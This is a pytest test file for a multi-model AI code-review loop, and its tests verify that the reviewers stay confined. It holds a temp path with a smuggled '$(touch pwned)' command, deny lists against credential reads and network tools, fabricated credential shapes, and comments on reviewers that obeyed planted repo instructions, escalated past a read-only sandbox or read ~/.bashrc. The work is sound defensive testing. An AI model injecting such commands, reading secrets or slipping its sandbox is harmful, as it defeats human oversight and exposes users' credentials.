    def test_without_pgrep_groups_are_asked_of_proc(self, tmp_path: Path) -> None:
        # The check is decided once, before anything is launched.
        runner = runner_script()
        start = runner.index("if pgrep -s 0 -g 0")
        decide = runner[start : runner.index("\nfi\n", start) + 4]
        script = tmp_path / "t.sh"
        script.write_text("pgrep() { return 127; }\n" + decide + "echo $GROUP_CHECK\n")
        done = subprocess.run(
            ["bash", str(script)], capture_output=True, text=True, timeout=30
        )
        assert done.stdout.strip() == "proc", done.stderr

    @pytest.mark.skipif(shutil.which("setsid") is None, reason="needs setsid")
    @pytest.mark.parametrize("check", GROUP_CHECKS)
    def test_a_group_that_is_no_longer_this_runs_is_left_alone(
        self, tmp_path: Path, check: str
    ) -> None:
        # bash reaps a finished job at once; once its group empties, the number can go
        # to someone else's new session -- a shell, an ssh login -- and was killed. The
        # first fallback for a missing pgrep asked only whether the number existed.
        runner = runner_script()
        script = tmp_path / "t.sh"
        script.write_text(
            f"GROUP_CHECK={check}\n"
            + shell_function(runner, "kill_jobs")
            + _liveness(runner)
            # Another session's group leader standing in for a reused number.
            + "setsid sleep 30 & other=$!\nsleep 0.3\n"
            + "JOB_PID=([1]=$other)\nkill_jobs 1\n"
            + 'kill -0 "$other" 2>/dev/null && echo ALIVE || echo KILLED\nkill "$other"\n'
        )
        done = subprocess.run(
            ["bash", str(script)], capture_output=True, text=True, timeout=30
        )
        assert done.stdout.strip() == "ALIVE", done.stdout + done.stderr

    def test_a_bedrock_project_gets_neither_google_cli_by_default(self) -> None:
        # The gemini branch had no gate: with Hermes unavailable, a project pinned to
        # Bedrock sent slot 3 to Google through it.
        runner = runner_script()
        # Nor any other: gemini is opt-in in both modes now.
        gated = "elif $HAS_GEMINI && review_helper flag REVIEW_USE_GEMINI \\\n"
        assert gated in runner
        # And the switches reach the runner, a separate script that inherits only exports.
        doc = AGENT_DOC.read_text()
        export = doc.split("export REVIEW_TMP", 1)[1].split('\n"', 1)[0]
        assert "REVIEW_USE_AGY" in export and "REVIEW_USE_GEMINI" in export
        # agy is not even detected for such a project.
        detection = doc[doc.index("PREFER_HERMES=false") : doc.index("HAS_AGY=true")]
        assert 'review_helper agy-detect "$PREFER_HERMES"' in detection

    @pytest.mark.parametrize(
        ("tools", "denied", "scoped"),
        [
            # The default list: everything that writes, runs a command, or goes online.
            ("Read Grep Glob", "Edit Write MultiEdit NotebookEdit Bash WebFetch WebSearch ReportFindings", []),
            # Tools given on purpose come off the list, and only those.
            ("Read Grep Glob Bash Edit Write", "MultiEdit NotebookEdit WebFetch WebSearch ReportFindings", []),
            ("Read,Bash", "Edit Write MultiEdit NotebookEdit WebFetch WebSearch ReportFindings", []),
            ("Read Edit Write MultiEdit NotebookEdit Bash WebFetch WebSearch ReportFindings", "", []),
            # A scoped grant names the tool too -- and only the tool, not its scope --
            # and is said to be granted whole.
            ("Read Grep Bash(git log:*)", "Edit Write MultiEdit NotebookEdit WebFetch WebSearch ReportFindings", ["Bash"]),
            (
                "Read Bash(git log --grep Edit --all:*)",
                "Edit Write MultiEdit NotebookEdit WebFetch WebSearch ReportFindings", ["Bash"],
            ),
            # Unbalanced: nothing is granted.
            ("Read Edit Bash(git", "Edit Write MultiEdit NotebookEdit Bash WebFetch WebSearch ReportFindings", []),
            ("Read Edit) Bash", "Edit Write MultiEdit NotebookEdit Bash WebFetch WebSearch ReportFindings", []),
        ],
    )  # fmt: skip
    def test_an_override_lifts_only_the_tools_it_names(
        self, tools: str, denied: str, scoped: list[str]
    ) -> None:
        # Any REVIEWER_TOOLS_N used to drop the deny list whole, read-only lists included.
        assert claude_denied(tools) == (denied.split(), scoped)

    def test_the_runner_denies_what_the_loop_denies(self, tmp_path: Path) -> None:
        # Two parsers, one in bash and one implied by the loop's fixed list, drifted:
        # the runner's list had no network tools. Now both are claude_denied's.
        runner = runner_script()
        assert 'local tools="${!tools_var:-Read Grep Glob}"' in runner
        assert '--allowedTools "$tools" "${CLAUDE_DENY[@]}" \\\n' in runner
        flags = "--strict-mcp-config --setting-sources user --permission-mode dontAsk"
        assert flags + " \\\n" in runner
        script = tmp_path / "t.sh"
        script.write_text(
            f"HELPER_ROOT={shlex.quote(str(REPO_ROOT))}\n"
            f"OUT_DIR={shlex.quote(str(tmp_path))}\n"
            + shell_function(runner, "review_helper")
            + shell_function(runner, "claude_deny")
            + 'claude_deny 2 "$1"\necho "${#CLAUDE_DENY[@]}|${CLAUDE_DENY[*]}"\n'
        )
        # The credential reads are denied whatever is granted.
        reads = " ".join(f"Read({path})" for path in claude_tools._secret_reads())
        for tools, expected in [
            ("Read Grep Glob", "2|--disallowedTools Edit Write MultiEdit NotebookEdit"
             f" Bash WebFetch WebSearch ReportFindings {reads}"),
            ("Read Edit Write MultiEdit NotebookEdit Bash WebFetch WebSearch ReportFindings",
             f"2|--disallowedTools {reads}"),
        ]:  # fmt: skip
            done = subprocess.run(
                ["bash", str(script), tools], capture_output=True, text=True, timeout=30
            )
            assert done.stdout.strip() == expected, done.stderr
        done = subprocess.run(
            ["bash", str(script), "Read Bash(git log:*)"],
            capture_output=True, text=True, timeout=30,
        )  # fmt: skip
        # Said, and not taken for part of the deny list: it was, once.
        note, denied = done.stdout.strip().split("\n")
        assert note.startswith("R2: note: Bash is granted whole"), done.stdout
        assert denied == (
            "2|--disallowedTools Edit Write MultiEdit NotebookEdit WebFetch WebSearch"
            f" ReportFindings {reads}"
        )

    def test_a_claude_reviewer_cannot_read_credentials(self) -> None:
        # Its reads are not confined to the repository: measured, it read ~/.bashrc.
        cmd = reviewers_mod._claude_cmd(1)
        denied = cmd[cmd.index("--disallowedTools") + 1].split()
        assert "Read(~/.ssh/**)" in denied and "Read(~/.aws/**)" in denied
        assert claude_denied("Read Grep Glob")[0] == [
            d for d in denied if not d.startswith("Read(")
        ]

    def test_the_audit_does_not_quote_a_credential(self, tmp_path: Path) -> None:
        # Its quoted lines come from whole changed files, which the diff's scrubbing
        # never saw, and the audit goes into every reviewer's prompt.
        from scripts.preflight import patterns

        # Built from parts: written out, this line would be redacted from the diff.
        secret = "pass" + "word = " + repr("hunter2" * 3) + "  # except Exception"
        assert patterns._quoted(secret) == patterns.REDACTED
        assert patterns._quoted("    except Exception:  ") == "except Exception:"

    def test_a_codex_that_hangs_drops_its_slot(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        # With no deadline, the check held up every reviewer: it runs before any.
        def hangs() -> tuple[bool, str]:
            raise subprocess.TimeoutExpired(["codex", "sandbox"], 30)

        monkeypatch.setattr(backends, "codex_is_confined", hangs)
        monkeypatch.delenv("MMCRA_SKIP_CODEX_SANDBOX_CHECK", raising=False)
        ok, reason = backends.codex_usable()
        assert not ok and "did not finish" in reason

    def test_an_inherited_out_dir_is_not_removed(self) -> None:
        # Cargo and Android builds export OUT_DIR; the runner's early cleanup removed
        # whatever it named if the runner stopped before setting its own.
        runner = runner_script()
        early_trap = runner.index("trap 'rm -rf -- \"${HELPER_ROOT")
        assert runner.index('OUT_DIR=""') < early_trap

    def test_the_loops_claude_reviewer_has_no_mcp_servers(self) -> None:
        cmd = reviewers_mod._claude_cmd(1)
        assert "--strict-mcp-config" in cmd
        # Nor the project's settings: measured, a project SessionStart hook ran.
        assert cmd[cmd.index("--setting-sources") + 1] == "user"
        # Nor the mode the user's settings choose: bypassPermissions runs anything.
        assert cmd[cmd.index("--permission-mode") + 1] == "dontAsk"
        denied = cmd[cmd.index("--disallowedTools") + 1].split()
        assert {"Bash", "Write", "WebFetch", "WebSearch"} <= set(denied)

    def test_no_reviewer_reads_the_branchs_own_instructions(self) -> None:
        # The repository is the reviewers' working directory, and its AGENTS.md (codex,
        # hermes) or CLAUDE.md (claude) would be read as instructions, outside the diff's
        # fence. Measured: codex followed an AGENTS.md until project_doc_max_bytes=0;
        # claude ignored a CLAUDE.md under --setting-sources user.
        from scripts.review_loop import reviewers

        assert "project_doc_max_bytes=0" in reviewers._codex_extra_args()
        assert "--ignore-rules" in reviewers._hermes_cmd(Path("p"), "m")
        claude = reviewers._claude_cmd(1)
        assert claude[claude.index("--setting-sources") + 1] == "user"
        runner = runner_script()
        assert "--provider bedrock -t file --yolo --ignore-rules" in runner
        assert "-c project_doc_max_bytes=0" in runner

    def test_codex_is_pinned_and_checked_as_in_the_loop(self) -> None:
        # The doc said codex was sandboxed in full mode; the runner passed no flag.
        runner = runner_script()
        codex = runner[runner.index("    codex)") : runner.index("    gemini)")]
        assert "-s read-only -c 'approvals_reviewer=\"user\"'" in codex
        assert "-c project_doc_max_bytes=0" in codex
        doc = AGENT_DOC.read_text()
        detection = doc[doc.index("HAS_CODEX=false") : doc.index("HAS_AGY=false")]
        assert "review_helper codex-check || HAS_CODEX=false" in detection

    def test_a_failed_slot_still_produces_a_result_with_a_true_reason(self) -> None:
        runner = runner_script()
        # Every slot must yield a result-N.json so the report can be honest about what is missing,
        # and the reason must distinguish the cases a reader would act on differently.
        assert "124|137" in runner, (
            "a reviewer killed by its own timeout is reported as a parse error"
        )
        assert "never launched" in runner
        assert "killed by the watchdog" in runner


class TestCodexSandboxVerification:
    """An unconfined codex must be DROPPED, not used.

    The failure this guards against is specific: a reviewer that silently has write access
    to the repo it is reviewing. It has happened, from two unrelated causes (a kernel that
    blocks bubblewrap's user namespaces, and a global approvals_reviewer that escalates
    past -s read-only), so confinement is proven per-run rather than assumed.
    """

    def test_unconfined_codex_is_disabled(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("MMCRA_SKIP_CODEX_SANDBOX_CHECK", raising=False)
        monkeypatch.setattr(backends.shutil, "which", lambda c: f"/usr/bin/{c}")
        monkeypatch.setattr(backends, "codex_is_confined", lambda: (False, "sandbox allowed a write"))
        assert backends.detect_backends()["codex"] is False
        # The other backends are unaffected by codex's verdict.
        assert backends.detect_backends()["claude"] is True

    def test_confined_codex_is_kept(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("MMCRA_SKIP_CODEX_SANDBOX_CHECK", raising=False)
        monkeypatch.setattr(backends.shutil, "which", lambda c: f"/usr/bin/{c}")
        monkeypatch.setattr(backends, "codex_is_confined", lambda: (True, "verified"))
        assert backends.detect_backends()["codex"] is True

    def test_check_can_be_skipped_for_externally_sandboxed_hosts(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        monkeypatch.setenv("MMCRA_SKIP_CODEX_SANDBOX_CHECK", "1")
        monkeypatch.setattr(backends.shutil, "which", lambda c: f"/usr/bin/{c}")

        def _boom() -> tuple[bool, str]:  # must not even be called
            raise AssertionError("confinement check ran despite the skip flag")

        monkeypatch.setattr(backends, "codex_is_confined", _boom)
        assert backends.detect_backends()["codex"] is True

    def test_a_sandbox_that_cannot_start_is_not_treated_as_confined(
        self, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The ambiguity at the heart of this bug.

        If the sandbox never launches, the canary survives untouched -- which looks exactly
        like a correctly refused write. Reporting that as "confined" is how an unconfined
        reviewer gets trusted, so a sandbox that cannot start must fail the check.
        """
        monkeypatch.setattr(backends.shutil, "which", lambda c: f"/usr/bin/{c}")
        monkeypatch.setattr(
            backends,
            "run",
            lambda *a, **k: SimpleNamespace(stdout="", stderr="bwrap: setting up uid map: Permission denied"),
        )
        ok, reason = backends.codex_is_confined()
        assert ok is False
        assert "could not start" in reason
        assert "user namespace" in reason  # points at the actual remedy


class TestSignalsUnwind:
    """proc.signals_unwind: a kill or a closed terminal unwinds instead of skipping cleanup."""

    def test_a_signal_the_caller_ignores_stays_ignored(self) -> None:
        # nohup ignores SIGHUP so a long run survives a closed ssh session; turning it
        # into an exit lost the round.
        from scripts.review_loop.proc import signals_unwind

        before = signal.signal(signal.SIGHUP, signal.SIG_IGN)
        try:
            with signals_unwind():
                assert signal.getsignal(signal.SIGHUP) is signal.SIG_IGN
                assert signal.getsignal(signal.SIGTERM) is not signal.SIG_DFL
            assert signal.getsignal(signal.SIGHUP) is signal.SIG_IGN
        finally:
            signal.signal(signal.SIGHUP, before)


class TestCodexCanaryPath:
    """The canary's path reaches codex's sandbox as an argument, never as script text."""

    def test_an_odd_temporary_path_is_one_path_and_never_code(
        self, monkeypatch: pytest.MonkeyPatch, tmp_path: Path
    ) -> None:
        # TMPDIR="/tmp/review scratch" split the path in two and disabled a working
        # codex; a shell character in it would have run.
        odd = tmp_path / "review scratch $(touch pwned)"
        odd.mkdir()
        monkeypatch.setattr(backends.tempfile, "tempdir", str(odd))
        monkeypatch.setattr(backends.shutil, "which", lambda c: f"/usr/bin/{c}")
        seen: list[list[str]] = []

        def through_sh(
            cmd: list[str], **kw: object
        ) -> subprocess.CompletedProcess[str]:
            seen.append(cmd)
            # What codex would run inside its sandbox, run here by a real shell.
            inner = cmd[cmd.index("--") + 1 :]
            return subprocess.run(inner, capture_output=True, text=True, check=False)

        monkeypatch.setattr(backends, "run", through_sh)
        ok, reason = backends.codex_is_confined()
        # Outside a sandbox the write lands, so the check fails -- at the write, which
        # means the read found the canary through the odd path.
        assert not ok and "ALLOWED a write" in reason, reason
        assert not any(p.name == "pwned" for p in tmp_path.rglob("pwned"))
        for cmd in seen[1:]:
            assert str(odd) not in cmd[cmd.index("-c") + 1]


class TestCredentialShapes:
    """Credentials the scrubber knows by their shape alone."""

    # Each built from parts: written out, the line would be redacted from this
    # repository's own review diff.
    @pytest.mark.parametrize(
        "secret",
        [
            "postgres://app" + ":hunter2pass" + "@db.internal/prod",
            "redis://" + ":hunter2pass" + "@cache:6379/0",
            "https://u" + ":p" + "@proxy:3128",
            "postgres://u" + ":Zx9/k+Q==" + "@db/prod",
            "postgres://u" + ":it's-me" + "@db/prod",
            "postgres://app@srv" + ":hunter2pass" + "@srv.example.net/db",
            "postgres://u" + ":hunter2pass" + "@[::1]:5432/db",
            "postgres://u" + ":$ecret9" + "@db/prod",
            "mysql://root" + ":12345" + "@localhost/db",
            "postgres://u" + ":" + "q7A_" * 80 + "@db/prod",
            "redis://" + ":8080/abc" + "@cache:6379/0",
            "postgres://u" + ":pass/W0rd9" + "@db/prod",
            "HTTPS://u" + ":p4ssw0rd9" + "@proxy:3128",
            "postgres://u" + ":a#b?c9" + "@db",
            "postgres://app.user" + ":hunter2" + "@db",
            '"postgresql://alice' + ":K7a');s9" + '@db/prod"',
            "postgres://u" + ":${DB_PASS:-hunter2}" + "@db",
            "postgres://u" + ":{x!y-9}" + "@db",
            "postgres://u" + ":#Ab9x!" + "@db",
            "postgres://app" + ":2024#Sec9" + "@db/prod",
            "postgres://u" + ':ab"cd9' + "@db",
            "ya" + "29." + "a" * 30,
            "1/" + "/0" + "a" * 40,
            "GOC" + "SPX-" + "a" * 28,
            "hf" + "_" + "A" * 34,
            "np" + "m_" + "A" * 36,
            "py" + "pi-AgE" + "A" * 60,
            "AIza" + "S" * 35,
            "github" + "_pat_" + "A" * 40,
            "gh" + "s_" + "a" * 36,
            "sk" + "_live_" + "x" * 24,
            "xo" + "xb-" + "1234567890-abc",
            "xa" + "pp-1-" + "A" * 24,
            "hooks.slack.com/services/" + "T0123/B0456/" + "a" * 24,
            "discord.com/api/" + "webhooks/123/" + "a" * 60,
            "S" + "G." + "a" * 22 + "." + "b" * 43,
        ],
        ids=["url-userinfo", "url-no-user", "url-short-password", "url-slash-password",
             "url-quote-password", "url-azure-user", "url-ipv6-host", "url-dollar-password", "url-numeric-password",
             "url-long-password", "url-no-user-slash-password",
             "url-placeholder-word-prefix",
             "url-upper-case-scheme", "url-query-chars-password", "url-dotted-user",
             "url-double-quoted-apostrophe", "url-shell-default-password",
             "url-braced-password", "url-hash-first-password", "url-dquote-password",
             "url-digits-hash-password",
             "google-oauth-access", "google-oauth-refresh",
             "google-client-secret", "huggingface", "npm", "pypi", "google-api-key", "github-fine-grained", "github-app",
             "stripe-live", "slack", "slack-app", "slack-webhook", "discord-webhook",
             "sendgrid"],
    )  # fmt: skip
    def test_more_credential_shapes_are_redacted(self, secret: str) -> None:
        # None was caught, and with agy on by default the diff goes to Google too.
        line = f"+CONFIG = {secret!r}\n"
        assert scrub_diff.scrub_line(line, False) != line

    def test_a_long_line_is_scanned_quickly(self) -> None:
        # The URL pattern took quadratic time on a long alphanumeric line.
        import time as clock

        line = "+" + "a" * 200_000 + "\n"
        started = clock.monotonic()
        scrub_diff.scrub_line(line, False)
        assert clock.monotonic() - started < 2

    def test_an_unquoted_url_whose_password_holds_a_quote_is_redacted(self) -> None:
        # No quote opens it (YAML), so its ' followed by "," ends nothing; read with the
        # source rules, the password went out.
        line = "+dsn: postgresql://alice:" + "p4ss',word" + "@db/prod\n"
        assert scrub_diff.scrub_line(line, False) != line

    def test_a_password_ending_in_a_backslash_is_redacted(self) -> None:
        # Its backslash and the "@" were read as one escaped character, and there was
        # no "@" left to end the password at.
        line = "+dsn: 'postgresql://alice:" + "p4ss\\" + "@db/prod'\n"
        assert scrub_diff.scrub_line(line, False) != line

    def test_an_escaped_apostrophe_closes_no_string(self) -> None:
        # Its \' was taken for the end of a single-quoted string, and the password
        # after it went out.
        url = "postgresql://alice:" + "K7a\\');s9" + "@db/prod"
        line = "+DSN = '" + url + "'\n"
        assert scrub_diff.scrub_line(line, False) != line
        # Two backslashes are one escaped backslash: the quote after them does close
        # the string, and the next one is another string.
        kept = "+x = ['http://h:8080\\\\','ops@x']\n"
        assert scrub_diff.scrub_line(kept, False) == kept

    def test_a_quote_of_the_other_kind_in_a_quoted_password_ends_nothing(
        self,
    ) -> None:
        # Inside '...' a " followed by ")" ends nothing, nor a ' inside a backtick.
        for line in (
            "+x = 'postgres://u:" + 'p4ss");x' + "@db'\n",
            "+x = `postgres://u:" + "p4ss');x" + "@db`\n",
        ):
            assert scrub_diff.scrub_line(line, False) != line

    def test_an_apostrophe_password_in_double_quotes_is_redacted(self) -> None:
        # Its ' was taken for the end of a string, and the password got through.
        url = "postgresql://alice:" + "K7a');s9" + "@db/prod"
        line = '+DSN = "' + url + '"\n'
        assert scrub_diff.scrub_line(line, False) != line
        # And in double quotes, a port and a path with an @ are still no password, nor
        # an scp-style git address with a revision.
        for url in ("http://host:8080/@scope/pkg", "git+ssh://git@h.com:org/r.git@v1"):
            kept = f'+URL = "{url}"\n'
            assert scrub_diff.scrub_line(kept, False) == kept

    @pytest.mark.parametrize("piece", [":{", ":${A", ":<", ":%(", ":*", ":c", "@:"])
    def test_a_line_of_unfinished_placeholders_is_scanned_quickly(
        self, piece: str
    ) -> None:
        # Unbounded, each placeholder's scan ran to the end of the line from every
        # URL on it.
        import time as clock

        line = "+" + ("a://b" + piece + "c" * 50) * 4000 + "\n"
        started = clock.monotonic()
        scrub_diff.scrub_line(line, False)
        assert clock.monotonic() - started < 2

    def test_a_url_without_a_password_is_kept(self) -> None:
        line = (
            "+see https://example.com/a:b and git@github.com:org/repo"
            " and http://host:8080/path?to=a@b\n"
        )
        assert scrub_diff.scrub_line(line, False) == line

    @pytest.mark.parametrize(
        "password",
        ["{password}", "${DB_PASS}", "$DB_PASS", "%(pw)s", "<password>", "****",
         "xxx", "pass" + "word", "secret", "changeme"],
    )  # fmt: skip
    def test_a_placeholder_password_is_kept(self, password: str) -> None:
        # Templates and documentation's example URLs were redacted, and a redaction
        # aborts the review with advice to rotate a credential that does not exist.
        line = f"+DSN = 'postgresql://{{user}}:{password}@{{host}}/db'\n"
        assert scrub_diff.scrub_line(line, False) == line

    @pytest.mark.parametrize(
        "url",
        [
            "http://host:8080?to=a@b",
            "http://host:8080#to=a@b",
            "ws://h:1?u=x:y@z",
            "http://[::1]:8080/@scope/pkg",
            "http://localhost:{port}/@scope/pkg",
            "http://localhost:${PORT}/@scope/pkg",
            "http://localhost:/@scope/pkg",
            "http://localhost:000080/@scope/pkg",
            "git+ssh://git@github.com:org/repo.git@v1.0",
            "'https://example.com'.replace('x','mailto:ops@example.com')",
            '<a href="http://localhost:8080">ops@example.com</a>',
            "const a = [`http://localhost:8080`,`ops@example.com`]",
            "<a href='http://localhost:8080'>ops@example.com</a>",
            "postgres://u:{{password}}@h",
            "postgres://u:{password!r}@h",
            "postgres://u:%(pw)d@h",
            "postgres://u:{0}@h",
            "['http://localhost:8080','ops@example.com']",
            "redis://h:6379/0?x=a@b",
            "redis://localhost:6379/@x",
            "redis://cache:6379/@x",
            "['https://example.com','mailto:ops@example.com']",
            "postgres://u:${PORT:-5432}/x@y",
            "http://localhost:${PORT:-8080}/@scope/pkg",
            "amqp://rabbit:5672/@vhost",
            # RFC 3986: userinfo ends at the first "/", so this is host u, port 8080.
            "postgres://u:8080/abc@db/prod",
            "amqp://broker.internal:5672/@vhost",
            "redis://10.0.0.1:6379/0@x",
        ],
    )
    def test_a_query_or_fragment_with_an_at_is_kept(self, url: str) -> None:
        # A port and then a query holding an @ was taken for a password, and a
        # redaction aborts the whole review.
        line = f"+see {url}\n"
        assert scrub_diff.scrub_line(line, False) == line


class TestReviewedFixtures:
    """A line a linter flagged and a person then marked as a fixture.

    The scrubber cannot tell `TOKEN = "token-for-tests"` from a live
    credential, and getting it wrong is expensive in one direction: a
    redaction does not scrub the review, it *aborts* it. So where ruff has
    already asked the question -- `S105`, `S106`, `S107`, "possible hardcoded
    password" -- and somebody has already answered it on that line, the answer
    is honoured.

    Only for the patterns that recognise a credential by the *name* beside it.
    A string shaped like a live key is not excusable, because a comment calling
    one a fixture is exactly what somebody would write to smuggle one past.
    """

    @pytest.mark.parametrize("code", ["S105", "S106", "S107"])
    def test_a_suppressed_keyword_match_is_kept(self, code: str) -> None:
        line = f'+TOKEN = "token-for-tests"  # noqa: {code} - a fixture\n'
        assert scrub_diff.scrub_line(line, False) == line

    def test_a_suppression_among_others_still_counts(self) -> None:
        line = '+TOKEN = "token-for-tests"  # noqa: E501, S105\n'
        assert scrub_diff.scrub_line(line, False) == line

    def test_the_same_line_without_the_suppression_is_redacted(self) -> None:
        """The suppression is the whole signal, so it has to be load-bearing."""
        line = '+TOKEN = "token-for-tests"\n'
        assert scrub_diff.scrub_line(line, False) != line

    def test_an_unrelated_suppression_does_not_count(self) -> None:
        line = '+TOKEN = "token-for-tests"  # noqa: E501\n'
        assert scrub_diff.scrub_line(line, False) != line

    @pytest.mark.parametrize(
        "secret",
        [
            "sk-ant-api03-aaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            "AKIAIOSFODNN7EXAMPLE",
            "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
            "glpat-aaaaaaaaaaaaaaaaaaaaaa",
        ],
    )
    def test_a_credential_shape_is_redacted_whatever_the_comment_says(
        self, secret: str
    ) -> None:
        """The bypass this must not have.

        A live key with `# noqa: S105` on it is what somebody writes to get a
        key past a scrubber, deliberately or by copying a line that worked.
        """
        line = f'+api_key = "{secret}"  # noqa: S105 - honestly a fixture\n'
        assert scrub_diff.scrub_line(line, False) != line

    def test_a_private_key_banner_is_redacted_whatever_the_comment_says(self) -> None:
        line = "+-----BEGIN OPENSSH PRIVATE KEY-----  # noqa: S105\n"
        assert scrub_diff.scrub_line(line, False) != line

    def test_a_dotenv_path_is_redacted_whatever_the_comment_says(self) -> None:
        line = '+path = ".env.production"  # noqa: S105\n'
        assert scrub_diff.scrub_line(line, False) != line

    def test_the_two_pattern_lists_are_the_whole_of_the_old_one(self) -> None:
        """Nothing may be dropped by the split, in either direction."""
        assert set(scrub_diff.CREDENTIAL_PATTERNS) == set(
            scrub_diff.KEYWORD_PATTERNS
        ) | set(scrub_diff.SHAPE_PATTERNS)
        assert not set(scrub_diff.KEYWORD_PATTERNS) & set(scrub_diff.SHAPE_PATTERNS)

    def test_a_suppression_cannot_be_smuggled_in_the_diff_prefix(self) -> None:
        """The body is what is searched, not the `+` in front of it."""
        line = '+TOKEN = "token-for-tests"\n'
        assert scrub_diff.scrub_line(line, False, in_hunk=True) != line


class TestReportOnly:
    """`--report-only`: run the reviewers, write the findings, change nothing.

    The workflow this serves is the one the loop was not built for. Somebody
    reads the findings and fixes them by hand -- because the merge agent's
    judgement is not trusted on that codebase, or because the fixes need a
    person. Left to itself the loop launches the merge agent the moment there
    is anything blocking, and the reviewer's findings then arrive tangled up
    with a diff nobody asked for.
    """

    @staticmethod
    def _source() -> str:
        return (REPO_ROOT / "scripts" / "review_until_converged.py").read_text()

    def test_the_flag_exists_and_says_what_it_does(self) -> None:
        source = self._source()
        assert '"--report-only"' in source
        assert "does not touch the working tree" in source

    def test_the_merge_agent_is_skipped(self) -> None:
        """The whole point. The return must come before `apply_fixes`."""
        source = self._source()
        skip = source.index("if report_only:")
        merge = source.index("if not apply_fixes(")
        assert skip < merge, "report_only must return before the merge agent runs"

    def test_the_exit_code_is_not_one_the_loop_already_uses(self) -> None:
        """A caller has to tell "findings, untouched" from every other stop.

        0 is converged, 3 is a failed merge agent, 6 is max rounds without
        convergence. Reusing any of those makes the flag unscriptable.
        """
        source = self._source()
        assert "return 10, current_fp" in source

    def test_the_reviewers_are_told_nobody_will_fix_it_for_them(self) -> None:
        """A reviewer asked to "find and fix" writes different findings from
        one asked to report: the first drifts towards what is easy to patch."""
        source = self._source()
        assert "a person will fix them" in source

    def test_the_flag_reaches_the_round(self) -> None:
        """It is threaded through by position; a missing argument would leave
        the default in place and silently run the merge agent anyway."""
        assert _threaded_into_the_round("args.report_only")


class TestAMissingReviewerIsNotConvergence:
    """A round in which a reviewer produced nothing is incomplete, not converged.

    Found in use: a reviewer's API key was revoked mid-session, its slot came back
    empty, and the three that answered had nothing blocking -- so the loop printed
    CONVERGED and exited 0, and a quarter of the review had silently not happened.
    `if not any(results)` only caught the case where *every* reviewer failed.
    """

    @staticmethod
    def _round(
        tmp_path: Path,
        results: list,
        report_only: bool = False,
        touched: list[str] | None = None,
    ):
        """One round with the reviewers stubbed out, returning (code, fingerprint, stdout)."""
        import io
        from contextlib import redirect_stdout

        import scripts.review_until_converged as loop

        diff = tmp_path / "diff.patch"
        diff.write_text("+ a line\n")
        audit = tmp_path / "audit.json"
        audit.write_text("{}")
        out = io.StringIO()
        with (
            mock.patch.object(loop, "collect_diff", return_value=(diff, 1)),
            mock.patch.object(loop, "run_preflight", return_value=audit),
            mock.patch.object(loop, "launch_reviewers"),
            mock.patch.object(loop, "extract_results", return_value=results),
            mock.patch.object(loop, "write_artifacts_key"),
            mock.patch.object(loop, "describe_outputs", return_value=""),
            # An untouched tree unless the test says otherwise: tmp_path is no git
            # repository, and the check fails closed there.
            mock.patch.object(loop.tamper, "report", return_value=touched or []),
            redirect_stdout(out),
        ):
            code, fp = loop._run_one_round(
                1, tmp_path, tmp_path, {}, "", set(), False, report_only=report_only
            )
        return code, fp, out.getvalue()

    @staticmethod
    def _clean(name: str) -> dict:
        return {"reviewer": name, "findings": [{"severity": "suggestion", "issue": "x"}]}

    @staticmethod
    def _blocking(name: str) -> dict:
        return {"reviewer": name, "findings": [{"severity": "critical", "issue": "y"}]}

    def test_the_missing_slots_are_named(self) -> None:
        from scripts.review_loop import missing_reviewers

        assert missing_reviewers([self._clean("a"), None, self._clean("c"), None]) == [2, 4]
        assert missing_reviewers([self._clean("a")] * 4) == []

    def test_nothing_blocking_with_a_reviewer_missing_is_exit_11(self, tmp_path: Path) -> None:
        results = [self._clean("a"), None, self._clean("c"), self._clean("d")]
        code, _, said = self._round(tmp_path, results)
        assert code == 11
        assert "INCOMPLETE: R2 produced no result" in said
        assert "3 of 4 reviewers" in said
        assert "CONVERGED: only suggestions remain" not in said
        assert "NOT CONVERGED" in said

    def test_every_reviewer_answering_still_converges(self, tmp_path: Path) -> None:
        """The contrast: the new exit is about the hole, not about suggestions."""
        code, _, said = self._round(tmp_path, [self._clean(n) for n in "abcd"])
        assert code == 0
        assert "CONVERGED: only suggestions remain" in said
        assert "INCOMPLETE" not in said

    def test_blocking_findings_are_still_reported_and_the_hole_is_still_said(
        self, tmp_path: Path
    ) -> None:
        """With something blocking the round goes on as before -- and says it is partial."""
        results = [self._blocking("a"), None, self._clean("c"), self._clean("d")]
        code, _, said = self._round(tmp_path, results, report_only=True)
        assert code == 10
        assert "INCOMPLETE: R2 produced no result" in said
        assert "Blocking findings: 1" in said

    def test_a_tampered_tree_stops_fix_mode_with_12(self, tmp_path: Path) -> None:
        # The merge agent, the gate and --auto-commit would have built on what a
        # reviewer wrote.
        import scripts.review_until_converged as loop

        planted = ["?? planted.py x"]
        results = [self._blocking("a")] + [self._clean(n) for n in "bcd"]
        with mock.patch.object(loop, "apply_fixes") as fixes:
            code, _, said = self._round(tmp_path, results, touched=planted)
        assert code == 12 and "ABORT: the reviewers changed the working tree" in said
        fixes.assert_not_called()
        # Nor does a round with nothing blocking call itself converged.
        clean = [self._clean(n) for n in "abcd"]
        code, _, said = self._round(tmp_path, clean, touched=planted)
        assert code == 12 and "CONVERGED" not in said
        # --report-only reports it, and goes on to its own exit.
        code, _, _ = self._round(tmp_path, results, report_only=True, touched=planted)
        assert code == 10
        # But not to "converged" when nothing is blocking.
        code, _, said = self._round(tmp_path, clean, report_only=True, touched=planted)
        assert code == 12 and "NOT CONVERGED" in said

    def test_the_new_exit_code_is_documented(self) -> None:
        readme = (REPO_ROOT / "README.md").read_text()
        assert "| 11 | **Incomplete** |" in readme
        assert "| 12 | **Tampered** |" in readme


class TestSecretReads:
    """What a claude reviewer may never read."""

    def test_only_the_granted_tools_exist_for_a_reviewer(self) -> None:
        # The deny list names what it denies; --tools leaves claude nothing else, for
        # a tool the list does not name (measured: given these, it listed these alone).
        from scripts.review_loop import reviewers

        cmd = reviewers._claude_cmd(1)
        assert cmd[cmd.index("--tools") + 1] == "Read,Grep,Glob"
        assert claude_tools.claude_tool_names("Read Bash(git log:*), Grep") == (
            "Read,Bash,Grep"
        )
        assert claude_tools.claude_tool_names("Read (") == ""  # unbalanced: nothing
        runner = runner_script()
